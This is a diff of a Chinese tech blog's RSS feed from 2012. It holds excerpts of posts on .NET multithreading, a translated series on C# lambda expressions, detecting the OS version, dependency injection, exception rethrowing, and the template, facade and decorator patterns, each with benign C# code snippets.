+什么是线程 一个线程就是在一个进程里执行的一条指令流，所有的线程都在一个进程里执行，也就是一个进程可以包含多个线程。线程公用进程的虚拟地址空间。线程是操作系统的调度单元。一个线程的上下文由操作系统进行保存/恢复。 也就是说： 1 .一个线程是进程里的一条指令流。 2 .所有的线程在进程里。一个进程可以有多个线程 3 .一个进程的所有线程使用进程的虚拟地址空间。
+什么是多线程 多线程指的是进程同时有多个线程活动。这可以通过时间片的线程模拟或是多cpu上的超线程来实现。可以提高性能。 多线程-为什么或是为什么不? 为什么多线程 1 .保持UI响应。 2 .提高性能(对于cpu密集型和I/O密集型的进程) 为什么不多线程 1 .过度使用降低性能 2 .代码复杂，增加设计时间，潜在的bug
+线程池 线程池为你的程序提供了一个由操作系统管理的机制。在线程池里的都是后台线程。一个线程池线程在程序的前台线程都退出后，也会推出。每个进程一个线程池。默认情况下。每个处理器会为进程分配25个线程。但是可以通过SetMaxThreads 方法来改变。
+.net 中的线程 在.net 中，线程可以通过下面6个方法来实现。 1 .Thread线程类 2 .Delegates委托 3 .Background Worker 4 .ThreadPool 线程池 5 .Task任务类 6 .Parallel并行类
+下面的几部分里。我将逐一展示实现方法。
+简而言之，多线程就是通过使程序同时运行多个任务来最大化计算机能力，同时能够保持UI响应。下图是一个例子的图示。</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第六部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/28/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86/</link>
+      <pubDate>Fri, 28 Dec 2012 14:24:35 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/28/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86/</guid>
+      <description>今天武汉地铁通车了，今天介绍一些新的Lambda设计模式，应该是最后一部分了。
+本节介绍一些核心有lambda表达式的模式，我不认为他们完全是新的模式，但是至少我还没有看到有人给他们起过名字，我于是决定尝试取个可能好，也可能不好的名字，这样我起码能很容易的给别人描述，有话在先，许多模式相当强大，但是可能会引入潜在的bug，所以小心为上
+复杂的多态
+Lambda表达式也可以被用来创建一些多态（override），而不用使用abstract或者virtual关键字（当然这并不意味着就不能用），考虑如下的代码片段
+class MyBaseClass { public Action SomeAction { get; protected set; } public MyBaseClass() { SomeAction = () =&amp;gt; { //Do something! }; } } 看起来没什么新的知识，我们创建一个类，里面有一个属性（一个lambda表达式），又一次JavaScript化了，有趣的地方是：属性暴露的这个部分不只是本类可以改变，子类也可以改变，看代码
+class MyInheritedClass : MyBaseClass { public MyInheritedClass { SomeAction = () =&amp;gt; { //Do something different! }; } }  看到了。我们可以改变这个方法。或者进行更精确的操作，这种方法的缺点是我们不能直接访问父类的实现，也就缺乏了基类的能力，因为，这个父类的属性会有同样的值，如果程序员真的需要这样写，我建议你遵循 pattern
+class MyBaseClass { public Action SomeAction { get; private set; } Stack&amp;lt;Action&amp;gt; previousActions; protected void AddSomeAction(Action newMethod) { previousActions.Push(SomeAction); SomeAction = newMethod; } protected void RemoveSomeAction() { if(previousActions.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第五部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/27/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86/</link>
+      <pubDate>Thu, 27 Dec 2012 09:15:29 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/27/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86/</guid>
+      <description>武汉下雪了。。今天介绍Lambda表达式非常有用的情况。。ps:这个高手之路已经翻译了10000多字了。。疼啊。。
+一些模式比另一些模式有时候更加合适，真正有用的模式是自定义方法表达式，用爱促使话一些对象的部分，我们考虑下面这种情况。
+我们想要创建一个可以处理多种延迟加载的对象，这意味着即时对象已经被实例化了，我们还没有加载所有请求的资源，一个理由就是防止大量的IO操作。（比如通过网络传输），当我们开始使用数据的时候，我们想要确定数据足够新鲜，现在有一些确定的方法可以做这个。并且最有效的显然是实体框架已经用LINQ解决了延迟加载的问题，Iqueryable仅存储了查询，而没有任何无关的数据。一旦我们请求一个结果。不仅仅构造的查询被执行，同时也被以更高效的方式执行，比如一个在远程数据服务器上的SQL查询。
+在这里，我们仅仅想要看看两种情况的不同点，首先，我们查询，一切就绪，查询应该在已经加载了的数据上进行。
+class LazyLoad { public LazyLoad() { Search = query =&amp;gt; { var source = Database.SearchQuery(query); Search = subquery =&amp;gt; { var filtered = source.Filter(subquery); foreach(var result in filtered) yield return result; }; foreach(var result in source) yield return result; }; } public Func&amp;lt;string, IEnumerable&amp;lt;ResultObject&amp;gt;&amp;gt; Search { get; private set; } }  简单来看，这里我们有两种不他哦你的方法，地一个是我们把数据从数据库里提取出来（也就是Database静态类所做的），然后第二个方法将会过滤从数据库里提取出来的数据。一旦我们将会从我们的第一次查询取得结果，当然我们也可以构造内置的其他方法来重置类的行为，对于工业级的代码，其他的方法也许更加有用。
+另一个例子是初始时间分支，假设我们有一个对象，该对象有个方法叫做Perform(),这个方法可以用来调用一些代码，包含这个方法的对象可以被初始化，初始化有三种方式。 1. 通过传递方法来调用 2. 通过传递一些包含这个方法的对象来调用 3. 或者通过传递第一种情况下的序列化以后的信息来调用。
+现在我们可以保留所有的三种方式做全局变量。而Perform方法将不得不查看当前的状态（或者是保存在枚举变量里，或者和null进行比较）然后检测被调用的正确的方式，最后调用开始。
+更好的一种方法是吧Perform()方法写成一个属性，这个属性仅仅允许在类里面进行set，它是一个委托类型，现在我们可以在对应的构造方法里面直接设置这个属性，因此，我们可以不用全局变量，也不用担心这个对象是如何实例化的，这种方法更好。
+看一小段简单的代码。
+class Example { public Action&amp;lt;object&amp;gt; Perform { get; private set; } public Example(Action&amp;lt;object&amp;gt; methodToBeInvoked) { Perform = methodToBeInvoked; } //接口 public Example(IHaveThatFunction mother) { //传递的对象必须有我们要用的方法 Perform = mother.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第四部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/24/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86/</link>
+      <pubDate>Mon, 24 Dec 2012 19:20:12 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/24/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86/</guid>
+      <description>首先祝大家平安夜快乐。本篇介绍一些流行的JavaScript模式。为下一篇打基础
+使用/了解JavaScript的一个好处就是函数的高级用法。。在JavaScript里。函数仅仅是对象。他们可以有赋给他们的属性。而在C#中。我们不能做我们可以在JavaScript的全部事情。但是我们仍然可以做些事情。一个原因是JavaScript在函数里给变量以作用域。因此，不得不通过创建函数，大多数情况是匿名的来定位变量。而在C#中。通过使用块，通过花括号来创建作用域
+当然，换种方式来说。C#中，函数也会给变量作用域。通过使用Lambda表达式。我们通过花括号在其里面创建了一个变量。然而。我们也可以局部的创建作用域。
+我们来看看通过使用Lambda表达式可以实现一些在JavaScript里面有用的模式把。
+回调模式
+这个模式是个老的模式。事实上。回调模式从.net 的第一版就开始使用了。但是是以一种很简单的方式实现的。而现在。通过使用Lambda表达式。闭包，捕获变量等特性能够允许我们写出如下的代码来。
+void CreateTextBox() { var tb = new TextBox(); tb.IsReadOnly = true; tb.Text = &#34;Please wait ...&#34;; DoSomeStuff(() =&amp;gt; { tb.Text = string.Empty; tb.IsReadOnly = false; }); } void DoSomeStuff(Action callback) { // Do some stuff - asynchronous would be helpful ... callback(); } 对于JavaScript程序员会觉得这没什么啊。他们使用这个模式太多了。然而，它非常有用。因为我们可以使用参数作为Ajax相关事件的事件处理器（比如oncompleted，onsuccess），等等。如果你使用LINQ，那么你可能也会用到回调模式的一些东西。举个例子。LINQ的where子句将会在每一次迭代中回调你的查询语句。这只是回调函数的一个例子。在.net的世界里。事件如它名字所暗示的那样。通常是事件处理的首选方法。这有时候很像一个回调。他有两个参数。有一个特殊的关键字和一个类型模式（两个参数分别是sender和arguments，sender通常是object类型。Arguments通常继承自EventArgs） 可以通过+= 和-=给事件添加/删除事件处理程序。
+返回方法 和普通的方法比较。Lambda表达式也可以返回一个方法指针（就是一个委托实例），这意味着我们可以使用Lambda表达式创建/返回一个lambda表达式（或者今年仅是一个已定义好的方法的委托实例），大量的情况下。这个模式也很有用。首先看一下例子。
+Func&amp;lt;string, string&amp;gt; SayMyName(string language) { switch(language.ToLower()) { case &#34;fr&#34;: return name =&amp;gt; { return &#34;Je m&#39;appelle &#34;</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第三部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/20/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/</link>
+      <pubDate>Thu, 20 Dec 2012 20:12:54 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/20/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/</guid>
+      <description>背后的秘密-MSIL
+通过著名的LINQPad，我们可以更深入的查看MSIL代码而没有任何秘密。下图是一个LINQPad的使用截图 
+我们会看三个例子，第一个Lambda表达式如下：
+Action&amp;lt;string&amp;gt; DoSomethingLambda = (s) =&amp;gt; { Console.WriteLine(s);// + local }; 对应的普通函数是这样的
+Action&amp;lt;string&amp;gt; DoSomethingLambda = (s) =&amp;gt; { Console.WriteLine(s);// + local };  生成的MSIL代码片段如下：
+DoSomethingNormal: IL_0000: nop IL_0001: ldarg.1 IL_0002: call System.Console.WriteLine IL_0007: nop IL_0008: ret &amp;lt;Main&amp;gt;b__0: IL_0000: nop IL_0001: ldarg.0 IL_0002: call System.Console.WriteLine IL_0007: nop IL_0008: ret  最大的不同是方法的名称用法不同。而不是声明。事实上。声明是完全一样的。编译器在类里面创建了一个新的方法来实现这个方法。这没什么新东西，仅仅是为了我们使用Lambda表达式方便代码编写。从MSIL代码中，我们做了同样的事情。在当前对象里调用了一个方法。
+我们在下图里演示一下编译器所做的修改。在这个图例。我们可以看到编译器把Lambda表达式移动成了一个固定的方法。
+ 第二个例子将展示Lambda表达式真正的奇妙之处，在这个例子里。我们既使用了有着全局变量的普通方法也使用了有捕获变量的Lambda表达式。代码如下
+void Main() { int local = 5; Action&amp;lt;string&amp;gt; DoSomethingLambda = (s) =&amp;gt; { Console.WriteLine(s + local); }; global = local; DoSomethingLambda(&#34;</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第二部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/19/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</link>
+      <pubDate>Wed, 19 Dec 2012 20:03:20 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/19/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</guid>
+      <description>闭包的影响 为了展示闭包的影响，我们看下面这个例子。 var buttons = new Button[10];
+for(var i = 0; i &amp;lt; buttons.Length; i++) { var button = new Button(); button.Text = (i + 1) + &amp;ldquo;. Button - Click for Index!&amp;rdquo;; button.OnClick += (s, e) =&amp;gt; { Messagebox.Show(i.ToString()); }; buttons[i] = button; } //如果我们点击按钮会发生什么 这个问题很怪，我在我的JavaScript课程上经常问我的学生。95%的学生会说。显然按钮0显示0，按钮1显示1，等等。而不足5%的学生学习了闭包之后会明白。所有的按钮都会显示10.
+局部变量i的值改变了。并且等于buttons.Length。也就是10了。想要避免这个诡异的情况也很简单。如下就行了。 var button = new Button(); var index = i; button.Text = (i + 1) + &amp;ldquo;. Button - Click for Index!&amp;rdquo;; button.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第一部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/18/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</link>
+      <pubDate>Tue, 18 Dec 2012 19:38:42 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/18/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</guid>
+      <description>好长时间没发技术文章了，恰好看到一篇非常详细的Lambda文章。一边翻译一边学习。题目好像有点霸气。。
+介绍 Lambda表达式是使代码更加动态，易于扩展并且更加快速（看完本文你就知道原因了）的强有力的工具。也可以用来降低潜在的错误。同时可以利用静态输入和智能提示，就像VS里一样。
+&amp;nbsp;
+Lambda表达式在.net framework 3.5中提出来。并且在LINQ和ASP.NET MVC内部的一些技术中扮演了相当重要的角色。如果你考虑一下ASP.NET MVC中各类控件的实现。你就发现。奥妙就是他们大多使用了Lambda表达式。和Lambda表达式一起，使用Html扩展方法将会使得在后台创建模型成为可能。
+本文会讲到如下的知识。
+1.简短的介绍-Lambda表达式是什么，以及为什么和匿名方法不同（之前我们使用的） 2.走近Lambda表达式的性能-在哪些情况下比起标准方法，Lambda会提高/损失性能 3.深入-Lambda表达式在MSIL代码中是什么样 4.一些来自JS世界的模式映射到C#中 5.那些能够提高性能，并且代码看起来相当舒服的使用Lambda的情况。 6.一些我提出的新模式-当然有可能别人也提出来了。但这是我的思考结果。
+&amp;nbsp;
+如果你期望本文是一篇入门教程我可能要让你失望了，除非你真的很优秀并且很聪明，当然我不是这种人，所以我也想提前声明一下：为了读懂这篇文章你可能需要C#的一些高级知识，并且对C#比较了解。
+&amp;nbsp;
+你应该期望本文试着解释一些事情给你，也会解释一些有趣的问题，至少对我来说是这样的。最后我会展示一些实际的例子和模式，如我所说，Lambda表达式简化了很多情况。因此写显式的模式很有用。
+背景知识-什么是Lambda表达式 在C#1.0中，委托被提出了，它使得传递函数成为可能，一句话就是委托就是强类型的函数指针，但委托比指针更强大。一般传递一个函数需要如下几步。 1. 写一个委托（就像一个类）包含返回类型和参数类型 2. 使用委托作为某一个函数的参数类型，这样，该函数就可以接受和委托描述的有着相同签名的函数了 3. 将一个委托类型的函数传递给委托，创建一个委托实例。
+&amp;nbsp;
+如果听起来很复杂，确实本来很复杂，但这是必需的。（虽然不是造火箭，但是比你认为的要更多的代码），然而步骤三不是必需的，编译器会为你做他，但是步骤1和2却是必不可少的。
+&amp;nbsp;
+幸运的是C#2.0出现了泛型，现在我们也可以写泛型类，方法，更重要的是，泛型委托，然而，直到.net framework 3.5的时候。微软意识到实际上只有两种泛型委托（当然有一些不同的重载），会覆盖99%的使用情况：
+1.Action 没有任何输入参数，也没有输出参数。 2.Action&amp;lt;t1,…t16&amp;gt; 需要1-16个参数，没有输出参数。 3.Func&amp;lt;t1….t16,tout&amp;gt;需要0-16个参数，一个输出参数
+&amp;nbsp;
+Action和其对应的泛型版本（仅仅是一个动作，执行一些事情）返回void的时候。Func则可以返回最后一个参数指定的类型，通过这两个委托类型，我们事实上，大部分情况下。前面提到的三步中的第一部就不用写的。而第二步仍然需要。
+&amp;nbsp;
+那么如果我们想要运行代码的时候怎么做呢。在C#2.0中问题已经可以解决了。在这个版本里。我们可以创建委托方法，也就是一个匿名方法，然后这个语法一直未能流行起来，一个相当简化的匿名方法的版本类似这样： Func&amp;lt;double, double&amp;gt; square = delegate (double x) { return x * x; } 为了提高这种语法，欢迎来到Lambda表达式的国度。首先，这个Lambda名字怎么来的？事实上。来自于数学上的λ演算，更准确的说他是数学中一个正式的系统。用于通过变量绑定和替换来进行表达式计算，所以我们有0-N个输入参数和一个返回值，而在编程中，也可以没有返回值
+我们看一下Lambda表达式的一些例子 //编译器可以识别，然后就可以通过dummyLambda();来调用了 var dummyLambda = () =&amp;gt; { Console.WriteLine(&amp;ldquo;Hallo World from a Lambda expression!</description>
+    </item>
+    
+    <item>
+      <title>3分钟理解Lambda表达式</title>
+      <link>https://leizhiyuan.github.io/2012/12/08/3%E5%88%86%E9%92%9F%E7%90%86%E8%A7%A3lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
+      <pubDate>Sat, 08 Dec 2012 19:26:51 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/08/3%E5%88%86%E9%92%9F%E7%90%86%E8%A7%A3lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
+      <description>1.什么是Lambda表达式
+Lambda表达式是一个匿名方法，通常在LINQ中被用来创建委托
+简单来说。它是一个没有声明，没有访问修饰符，没有返回值。甚至没有名字的方法。
+&amp;nbsp;
+2.为什么我们需要使用Lambda表达式？或者说为什么我们要写一个没有名字的函数？
+为了方便，这种快捷方式允许你在调用的地方直接编写代码，尤其是你想调用的代码只会在这个地方使用一次。并且方法体本身很短。节省了单独写方法中写声明等等的麻烦。。
+好处
+1.代码量减少。不必写方法的名称。返回值和访问修饰符
+2.当阅读代码的时候。直接就可以看到被调用函数的代码，不用去别的地方。
+Lambda表示应该短些。太复杂了。可读性就下降了
+&amp;nbsp;
+如果编写Lambda表达式
+Lambda基本的定义是：参数=&amp;gt;执行代码
+举个例子 n = &amp;gt; n % 2 == 1 n是输入参数 n % 2 == 1 是函数体
+你可以读作：给这个匿名方法传入一个参数n，如果n是奇数就返回true
+&amp;nbsp;
+使用该Lambda的例子 List&amp;lt;int&amp;gt; numbers = new List&amp;lt;int&amp;gt;{11,37,52}; List&amp;lt;int&amp;gt; oddNumbers = numbers.where(n =&amp;gt; n % 2 == 1).ToList(); //现在oddNumbers 里面就是11和37了 ok.基本的Lambda表达式就是这样了。</description>
+    </item>
+    
+    <item>
+      <title>获取操作系统版本信息</title>
+      <link>https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/</link>
+      <pubDate>Fri, 23 Nov 2012 13:24:50 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/</guid>
+      <description>坊间流传的代码都有些问题，比如不能正常获取win7以上的版本信息，不能获取诸如专业版，旗舰版等的信息，不能正常获取操作系统位的信息。
+使用代码，写了一个简单的库来实现效果。用法大概如下： StringBuilder sb = new StringBuilder(String.Empty); sb.AppendLine(&amp;ldquo;Operation System Information&amp;rdquo;); sb.AppendLine(&amp;ldquo;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-&amp;rdquo;); sb.AppendLine(String.Format(&amp;ldquo;Name = {0}&amp;rdquo;, OSVersionInfo.Name)); sb.AppendLine(String.Format(&amp;ldquo;Edition = {0}&amp;rdquo;, OSVersionInfo.Edition)); if (OSVersionInfo.ServicePack!=string.Empty) sb.AppendLine(String.Format(&amp;ldquo;Service Pack = {0}&amp;rdquo;, OSVersionInfo.ServicePack)); else sb.AppendLine(&amp;ldquo;Service Pack = None&amp;rdquo;); sb.AppendLine(String.Format(&amp;ldquo;Version = {0}&amp;rdquo;, OSVersionInfo.VersionString)); sb.AppendLine(String.Format(&amp;ldquo;ProcessorBits = {0}&amp;rdquo;, OSVersionInfo.ProcessorBits)); sb.AppendLine(String.Format(&amp;ldquo;OSBits = {0}&amp;rdquo;, OSVersionInfo.OSBits)); sb.AppendLine(String.Format(&amp;ldquo;ProgramBits = {0}&amp;rdquo;, OSVersionInfo.ProgramBits));
+textBox1.Text = sb.ToString(); 对比一下坊间的几种不足： 总的来说。最大的问题就是不能正确检测你的操作系统到底是32位还是64位。几种方法大致如下： 1. 使用IntPtr指针的大小 最关键的一句代码是： return IntPtr.Size * 8; 但是事实上，这个返回的不是操作系统的位数，返回的是运行的程序的位数，如果在64位的windows上以32位的模式运行了这个程序，那么就会返回32.
+2. 使用PROCESSOR_ARCHITECTURE 环境变量 string pa = Environment.GetEnvironmentVariable(&amp;ldquo;PROCESSOR_ARCHITECTURE&amp;rdquo;); return ((String.IsNullOrEmpty(pa) || String.</description>
+    </item>
+    
+    <item>
+      <title>依赖倒置原则和依赖注入模式</title>
+      <link>https://leizhiyuan.github.io/2012/11/21/%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99%E5%92%8C%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F/</link>
+      <pubDate>Wed, 21 Nov 2012 13:46:48 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/21/%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99%E5%92%8C%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F/</guid>
+      <description>昨天读完了程杰的《大话设计模式》。。收获颇丰。深刻感到了设计模式的伟大。。对面向接口的编程也理解了不少。刚好看到codeproject上一篇将依赖倒置的。讲到了依赖注入的方式。仔细读了一下。翻译一遍加深认识。
+高耦合的代码随着项目复杂性的不断增加，最终会变成一碗碗的意大利面条啦。。二者通常是软件设计上的问题，如果一个类对另一个类的实现了解太多。当该类改变的时候会引起更多的改变。这违反了依赖倒置原则
+而松耦合的代码设计优良。随着时间流逝，代码复杂两增大，松耦合的好处会变得更加清晰，依赖注入模式是实现松耦合的一个好的办法，本文介绍在没有依赖注入容器的情况下实现依赖注入
+GoF说了，依赖倒置的原则：
+ 高层模块不应依赖于低层模块，他们都应该依赖于抽象 抽象不依赖细节，细节依赖抽象
+ 刚开始写依赖倒置比较难，随着经验增长会有所改善，通过使高层模块依赖于抽象，依赖倒置成功解耦，依赖注入模式是该原则的一个实现。
+通常我们写出如下的代码：
+public class Email { public void SendEmail() { // code } } public class Notification { private Email _email; public Notification() { _email = new Email(); } public void PromotionalNotification() { _email.SendEmail(); } }  Notification类依赖Email类，这违反了DIP，而且当我们要发送短信/保存到数据库的时候，我们还要改变Notification类。 我们使用抽象类/接口解耦
+public interface IMessageService { void SendMessage(); } public class Email : IMessageService { public void SendMessage() { // code } } public class Notification { private IMessageService _iMessageService; public Notification() { _iMessageService = new Email(); } public void PromotionalNotification() { _iMessageService.</description>
+    </item>
+    
+    <item>
+      <title>C#中的throw</title>
+      <link>https://leizhiyuan.github.io/2012/11/18/c#%E4%B8%AD%E7%9A%84throw/</link>
+      <pubDate>Sun, 18 Nov 2012 12:33:49 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/18/c#%E4%B8%AD%E7%9A%84throw/</guid>
+      <description>Throw会抛出/传递异常,通过在catch块里使用throw语句.可以改变产生的异常,比如我们可以抛出一个新的异常,throw语句有各种各样的,并且很有必要.
+例子 我们首先看一下三个方法,分别叫做A,B,C，他们使用不同的throw语句。方法A使用了无参的throw语句。这可以被看作是rethrow(继续抛出)—他会抛出已经出现的同样的异常
+继续，方法B throw一个命名的异常变量。这就不是一个完全的rethrow了—因为他虽然抛出了同样的异常。但是改变了StackTrace（堆栈轨迹），如果有必要的话，我们可以收集一些异常信息，而方法C则创建了一个新的异常。 提示:你可以通过这种方法实现自定义的的错误处理 使用throw语句的例子 using System; class Program { static void Main() { try { A(); B(); C(null); } catch (Exception ex) { Console.WriteLine(ex); } }
+static void A() { // Rethrow 语法. try { int value = 1 / int.Parse(&amp;#34;0&amp;#34;); } catch { throw; } } static void B() { // 过滤异常类型. try { int value = 1 / int.Parse(&amp;#34;0&amp;#34;); } catch (DivideByZeroException ex) { throw ex; } } static void C(string value) { // 创建新的异常.</description>
+    </item>
+    
+    <item>
+      <title>理解并实现模板模式</title>
+      <link>https://leizhiyuan.github.io/2012/10/25/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/</link>
+      <pubDate>Thu, 25 Oct 2012 22:04:15 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/25/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/</guid>
+      <description>介绍 本文实现模板模式
+背景 有时候我们需要做很多任务，而做这些任务的算法可能不同，这样可以设计成策略模式，这样。执行该任务的基本的一些代码就是一样的。但程序可可以动态的切换来执行任务的不同部分了。
+现在，真实的情况是有些算法，从实现层面山看，有可能有一些步骤是不一样的，这种情况下。我们可以使用继承来完成。
+当有个算法，而这个算法的一部分却多样的时候。使用模板模式就很好。GoF定义模板模式为：
+ &amp;ldquo;Define the skeleton of an algorithm in an operation, deferring some steps to subclasses. Template Method lets subclasses redefine certain steps of an algorithm without changing the algorithm&amp;rsquo;s structure.&amp;rdquo;.
+ 定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板模式使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。
+ 在上面的类图中： AbstractClass：包含两种方法。第一种就是算法的每一步。另一种就是模板方法。模板方法就是那些可以被用在所有独立方法中。并且提供了算法执行的一个骨架 ConcreteClass：这个类重写了抽象类中每一步的方法，包含对这些步骤的个性化实现。
+使用代码 看一个简单的例子。假想我们有一个类用来读取数据。并且能够为信息管理系统到处数据。
+abstract class DataExporter { // 这个方法都是一致的 public void ReadData() { Console.WriteLine(&#34;Reading the data from SqlServer&#34;); } // 当报表格式顶的时候这个也是定的。 public void FormatData() { Console.WriteLine(&#34;Formating the data as per requriements.</description>
+    </item>
+    
+    <item>
+      <title>理解并实现外观设计模式</title>
+      <link>https://leizhiyuan.github.io/2012/10/23/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E5%A4%96%E8%A7%82%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</link>
+      <pubDate>Tue, 23 Oct 2012 18:31:47 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/23/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E5%A4%96%E8%A7%82%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</guid>
+      <description>介绍 本文介绍外观模式,并给出简单的实现示例
+背景
+写软件的时候,有时候需要处理一系列的对象来完成一个确定的任务.比如,我们给一个万能遥控器写代码,我们需要关掉所有的设备,那么,我们有这样几种选择.第一个就是手动选择每一个设备,然后一个接一个的关闭,这好傻.那我们为什么不再遥控器上放一个按钮,我们按一下就关掉了.按钮的命令会与设备控制器通信然后关掉他们.
+如果我们又想在晚上12的时候自动关闭设备,那么我们就会有一个基于事件的计时器,与设备通信,然后关闭设备,问题是在两种情况下我们都需要与这些对象通信的函数.
+有很多方法解决这个问题,为什么不能有一个对象,该对象的责任就是关闭设备,当我要关闭设备的时候,我调用该对象就行了.这也是外观模式的理念Gof大神定义外观模式 &amp;ldquo;Provide a unified interface to a set of interfaces in a subsystem. Façade defines a higher-level interface that makes the subsystem easier to use.&amp;rdquo;
+为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。
+看看模式图 
+注意外观对象仅仅是提供了对函数一起操作,.不能替换子系统的接口.子系统的类仍然可以被系统的其他部分访问.外观为子系统提供了一致的界面.
+使用代码 为了模拟外观模式,我们模拟一个小例子.试着实现一个简单的外观对象,该外观对象操作一些WP手机的控制器对象,我们先定义问题
+每天早上我跑步的时候,我都得对我的手机做出以下的事情.. 1. 关闭wifi 2. 切换到移动网络 3. 打开GPS 4. 打开音乐 5. 开始跑步追踪器
+跑完以后.,我又蛋疼的做出以下几件事 1. 在twitter和facebook上分享我的跑步数据 2. 关闭跑步追踪器 3. 关闭音乐 4. 关闭GPS 5. 关闭移动数据 6. 打开wifi
+目前我都是手工做的.,我们来实现这些假想的控制器类吧. class GPSController { bool isSwitchedOn = false;
+public bool IsSwitchedOn { get { return isSwitchedOn; } set { isSwitchedOn = value; DisplayStatus(); } } private void DisplayStatus() { string status = (isSwitchedOn == true) ?</description>
+    </item>
+    
+    <item>
+      <title>理解并实现装饰器模式</title>
+      <link>https://leizhiyuan.github.io/2012/10/22/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</link>
+      <pubDate>Mon, 22 Oct 2012 11:31:47 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/22/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid>
+      <description>背景 本文讨论装饰器模式,这个模式是因为很多情况下需要动态的给对象添加功能.比如我们创建了一个Stream类.后来需要对这个数据流类动态的添加一个加密功能.有人可能说把加密方法写到流类里面啊.然后使用一个bool变量来控制开关就行了.但是这样.这个加密方法只能写一种..如果用派生类来实现.那么..对于不同的加密方法.,都要创建一个子类,举个例子.比如有时候是一些函数的组合.我们最终的派生类的数目基本上就和排列组合的数目一样了.
